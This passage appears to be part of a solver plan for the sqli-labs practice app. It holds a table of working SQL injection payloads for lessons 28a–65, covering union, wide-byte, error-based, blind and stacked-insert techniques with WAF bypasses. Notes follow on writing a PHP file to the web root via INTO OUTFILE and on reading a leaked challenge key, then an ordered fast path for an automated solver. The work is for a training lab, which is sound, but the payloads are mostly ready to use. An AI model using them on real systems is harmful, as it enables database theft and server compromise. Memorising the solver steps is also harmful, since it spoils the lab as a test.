| 28a | union, union-select filtered | GET `/Less-28a/index.php?id=` | `-1') union(select(1),database(),3)-- ` | `Your Login name:security` |
| 29 | WAF/HPP `'` | GET `/Less-29/login.php?id=1&id=` | `-1' union select 1,database(),version()-- ` | `Your Login name:security` |
| 30 | WAF/HPP `"` | GET `/Less-30/login.php?id=1&id=` | `-1" union select 1,database(),version()-- ` | `Your Login name:security` |
| 31 | WAF/HPP `("` | GET `/Less-31/login.php?id=1&id=` | `-1") union select 1,database(),version()-- ` | `Your Login name:security` |
| 32 | wide byte `'` | GET `/Less-32/index.php?id=` | `-1\xdf' union select 1,database(),version()-- ` | `Your Login name:security` |
| 33 | wide byte `'` | GET `/Less-33/index.php?id=` | `-1\xdf' union select 1,database(),version()-- ` | `Your Login name:security` |
| 34 | wide byte POST | POST `/Less-34/index.php` | `uname=-1\xdf' union select database(),2#` | `Your Login name:security` |
| 35 | int (escapes moot) | GET `/Less-35/index.php?id=` | `-1 union select 1,database(),version()-- ` | `Your Login name:security` |
| 36 | wide byte `'` | GET `/Less-36/index.php?id=` | `-1\xdf' union select 1,database(),version()-- ` | `Your Login name:security` |
| 37 | wide byte POST | POST `/Less-37/index.php` | `uname=-1\xdf' union select database(),2#` | `Your Login name:security` |
| 38 | stacked/union/error | GET `/Less-38/index.php?id=` | `-1' union select 1,database(),version()-- ` (or stacked insert) | `Your Username is : security` |
| 39 | stacked/union/error int | GET `/Less-39/index.php?id=` | `-1 union select 1,database(),version()-- ` | `Your Username is : security` |
| 40 | stacked/union `('` | GET `/Less-40/index.php?id=` | `-1') union select 1,database(),version()-- ` (bool alt `1') and (ascii(substr(database(),1,1))>77)-- `) | `Your Username is : security` |
| 41 | stacked/union int | GET `/Less-41/index.php?id=` | `-1 union select 1,database(),version()-- ` (bool alt `1 and (ascii(substr(database(),1,1))>77)-- `) | `Your Username is : security` |
| 42 | POST stacked/error | POST `/Less-42/login.php` `login_user`,`login_password` | `login_password=' or extractvalue(1,concat(0x7e,(select database()),0x7e)) or '` | `XPATH syntax error` / `YOU ARE LOGGED IN AS` |
| 43 | POST stacked/error `('` | POST `/Less-43/login.php` | `login_password=') or extractvalue(1,concat(0x7e,(select database()),0x7e)) or ('` | `XPATH syntax error` / `YOU ARE LOGGED IN AS` |
| 44 | POST stacked/blind | POST `/Less-44/login.php` | `login_password=' or 1=1#` | 302 → `logged-in.php`: `YOU ARE LOGGED IN AS` |
| 45 | POST stacked/blind `("` | POST `/Less-45/login.php` | `login_password=') or 1=1#` | 302 → `logged-in.php`: `YOU ARE LOGGED IN AS` |
| 46 | ORDER BY numeric error | GET `/Less-46/index.php?sort=` | `1 and extractvalue(1,concat(0x7e,(select database()),0x7e))` | `XPATH syntax error` |
| 47 | ORDER BY string error | GET `/Less-47/index.php?sort=` | `1' and extractvalue(1,concat(0x7e,(select database()),0x7e))-- ` | `XPATH syntax error` |
| 48 | ORDER BY blind numeric | GET `/Less-48/index.php?sort=` | `1 and if((ascii(substr(database(),1,1))>77),1,extractvalue(1,concat(0x7e,database(),0x7e)))` | user rows present/absent |
| 49 | ORDER BY blind string | GET `/Less-49/index.php?sort=` | `1' and if((ascii(substr(database(),1,1))>77),1,extractvalue(1,concat(0x7e,database(),0x7e)))-- ` | user rows present/absent |
| 50 | ORDER BY + stacked/error | GET `/Less-50/index.php?sort=` | `extractvalue(1,concat(0x7e,(select database()),0x7e))` or `1;insert into users(id,username,password) values(100,'pwn','pwn')#` | `XPATH syntax error` / `pwn` row |
| 51 | ORDER BY + stacked/error | GET `/Less-51/index.php?sort=` | `1' and extractvalue(1,concat(0x7e,(select database()),0x7e))-- ` or `1';insert into users(…)#` | `XPATH syntax error` / `pwn` row |
| 52 | ORDER BY + stacked blind | GET `/Less-52/index.php?sort=` | `1;insert into users(id,username,password) values(100,'pwn','pwn')#` | `pwn` row on next `?sort=1` |
| 53 | ORDER BY + stacked blind | GET `/Less-53/index.php?sort=` | `1';insert into users(id,username,password) values(100,'pwn','pwn')#` | `pwn` row on next `?sort=1` |
| 54 | challenge union `'` | GET `?id=` + POST `key`,`answer_key` | union dump table/column/key, then POST key | `images/Less-54-1.jpg` |
| 55 | challenge union int | GET `?id=` + POST | `-1) union select 1,(<sub>),3-- ` | `images/Less-54-1.jpg` |
| 56 | challenge union `('` | GET `?id=` + POST | `-1') union select 1,(<sub>),3-- ` | `images/Less-54-1.jpg` |
| 57 | challenge union `"` | GET `?id=` + POST | `-1" union select 1,(<sub>),3-- ` | `images/Less-54-1.jpg` |
| 58 | challenge error `'` | GET `?id=` + POST | `-1' and extractvalue(1,concat(0x7e,(<sub>),0x7e))-- ` | `XPATH syntax error: '~…~'` then `Less-54-1.jpg` |
| 59 | challenge error int | GET `?id=` + POST | `-1 and extractvalue(1,concat(0x7e,(<sub>),0x7e))-- ` | idem |
| 60 | challenge error `("…")` | GET `?id=` + POST | `-1") and extractvalue(1,concat(0x7e,(<sub>),0x7e))-- ` | `XPATH syntax error: '~…~'` then `Less-54-1.jpg` |
| 61 | challenge error `(('` | GET `?id=` + POST | `-1')) and extractvalue(1,concat(0x7e,(<sub>),0x7e))#` | idem |
| 62 | challenge blind `('` | GET `?id=` + POST | `1') and (ascii(substr((<sub>),<pos>,1))>77)#` | `Your Login name :` present/absent → POST key → `Less-54-1.jpg` |
| 63 | challenge blind `'` | GET `?id=` + POST | `1' and (ascii(substr((<sub>),<pos>,1))>77)#` | idem |
| 64 | challenge blind `(($id))` | GET `?id=` + POST | `1)) and (ascii(substr((<sub>),<pos>,1))>77)#` | idem |
| 65 | challenge blind `("…")` | GET `?id=` + POST | `1") and (ascii(substr((<sub>),<pos>,1))>77)#` | `Your Login name : ` present/absent → POST key → `Less-54-1.jpg` |

---

## 6. Gaps / needs live verification

1. **L7 outfile path & permissions** — resolve `DOCUMENT_ROOT` via `GET {BASE}/Less-38/phpinfo.php` (§1.8) or probe
   with the L7 boolean `load_file()` oracle (§4.3); then write to `<DOCROOT>/Less-7/out.php`. Requires MySQL FILE
   privilege (db user is `root` → yes) and a docroot directory writable by the mysqld process; `secure_file_priv`
   (MySQL 5.5 default: empty = unrestricted) is worth checking if the write fails. The boolean fallback (P2) needs
   nothing extra.
2. **Image vs checkout** — the target is `acgpiano/sqli-labs:latest` (labs/docker-compose.yml), which may be an older
   snapshot than this checkout. Fingerprint once: `GET {BASE}/readme.txt`, `GET {BASE}/Less-38/phpinfo.php`,
   `GET {BASE}/sql-connections/test.php`, `GET {BASE}/sql-connections/setup-db-challenge.php`. If any 404s, adjust the
   shortcuts accordingly; lesson SQL/filters are expected to match (this checkout is the classic master snapshot
   `e96f217`). PHP 5.x / MySQL 5.x is required (`mysql_*`, `get_magic_quotes_gpc`, `UPDATEXML`).
3. **Challenge side channels** — `sql-connections/test.php` is present in this checkout (verified, §1.5) but confirm on
   the image. The attempt limit is source-confirmed *not enforced* server-side, so boolean extraction of 62–65 is
   feasible (~315 requests, §4.18). `INTO OUTFILE` for the blind pair needs FILE privilege + the docroot from item 1.
4. **`output_buffering`** — Less-20/21/22 login branch and Less-24/42–45 `login.php` call `setcookie()`/`header()`
   after HTML output. With `output_buffering=0` the cookies/redirects may be suppressed (PHP warning). Read
   `output_buffering` from `phpinfo.php`; workaround: send `Cookie: Auth=1` manually (24/42–45) or craft the `uname`
   cookie directly (20–22).
5. **XPath error truncation** — MySQL truncates the `UPDATEXML`/`EXTRACTVALUE` message content (~32 chars); the 24-char
   key fits (24 + 2 tildes). Split long values with `substr()`; the `Duplicate entry` (group-by) fallback is given in
   §4.1/§4.2/§4.18.
6. **Less-29/30/31 JSP variants** — `tomcat-files.zip` ships `Less-29..32/index.jsp` / `hacked.jsp`; they only matter if
   the deployment serves Tomcat. The compose target is the PHP image, so canonical endpoints are `login.php` (+ the
   no-WAF `index.php`).
7. **Less-40 leftovers** — the extra `login.php`/`pass_change.php`/`new_user.php`/… in `Less-40/` are unreferenced
   duplicates of the Less-24 app; `Less-40/index.php` is the stacked lesson. Ignore them unless a grader targets them.
8. **Wide-byte lessons 32–37** — the `%DF%27` bypass depends on escaping happening while the connection charset is
   still latin1 (`SET NAMES gbk` is issued *after* `addslashes`/`mysql_real_escape_string` in 34/36/37, and the custom
   filters in 32/33 are charset-unaware). If the server config forces a gbk default connection charset, the trick can be
   neutralised — confirm with the pages' "escaped input" hint; on failure use integer lesson 35 or other labs.
9. **`result.txt`** files log every payload (`ID:…`, `User Name:…`, `SORT:…`); no functional effect.
10. **Second-pass verification applied** — every SQL template/filter/marker above was re-derived from the lesson PHP.
    Corrections made vs the first draft: L27/27a permit tab/newline whitespace (only space/`+` stripped); L30 `login.php`
    does echo MySQL errors; L40/41 display `Your Username is :` (union rows work, not blind-only); challenge L60/L65 are
    `id=("$id")` → break-out `-1")`; challenge attempt limit is not enforced server-side.

---

## 7. Fast path for the automated solver (ordered)

1. **Recon (3 unauthenticated GETs):** `GET {BASE}/Less-38/phpinfo.php` → save `DOCUMENT_ROOT`, `output_buffering`,
   PHP version; `GET {BASE}/readme.txt` (image fingerprint); optionally `GET {BASE}/sql-connections/test.php`
   (if 200, save the challenge key — it solves all 12 challenge lessons, §7.4).
2. **Reset:** `GET {BASE}/sql-connections/setup-db.php` → deterministic seed data (admin/admin, Dumb/Dumb, …) and a
   fresh `challenges` DB. Run this before the suite and after any lesson that mutates shared state (Less-24/17/42–45,
   stacked inserts, challenge submissions).
3. **Lessons 1–53:** one request per lesson as listed in §5 / §4; assert the marker; keep `allow_redirects=False` for
   Less-7/23/29–31/46–53 and the login chains. Re-usable credentials: `Dumb/Dumb` for Less-18/19 (admin is mutated by
   Less-24/17 tests), and pick fresh explicit ids/usernames for every stacked INSERT.
4. **Lessons 54–65 (challenge):** all twelve share **one** random table + one secret key. Fastest order:
   a. `GET {BASE}/sql-connections/test.php` → `key` (if 200). Otherwise run the 2-request union extraction on
      Less-54 (`§4.18`) and/or the error extraction on Less-58 to obtain table/column/key.
   b. `POST {BASE}/Less-<N>/index.php` body `answer_key=Submit&key=<KEY>` for N = 54…65 **with
      `allow_redirects=False`** (do not follow the `Refresh:` header, which would regenerate table/column/key and
      invalidate the key for the remaining lessons). Success marker in each response: `images/Less-54-1.jpg`
      (shared by all twelve); failure: `images/slap1.jpg`.
   c. Only if a reset is unavoidable: `GET {BASE}/sql-connections/setup-db-challenge.php` (echoes the new random
      table name) and re-derive the key before submitting.
5. **Final state:** run `GET {BASE}/sql-connections/setup-db.php` once more so the lab is clean for later runs.
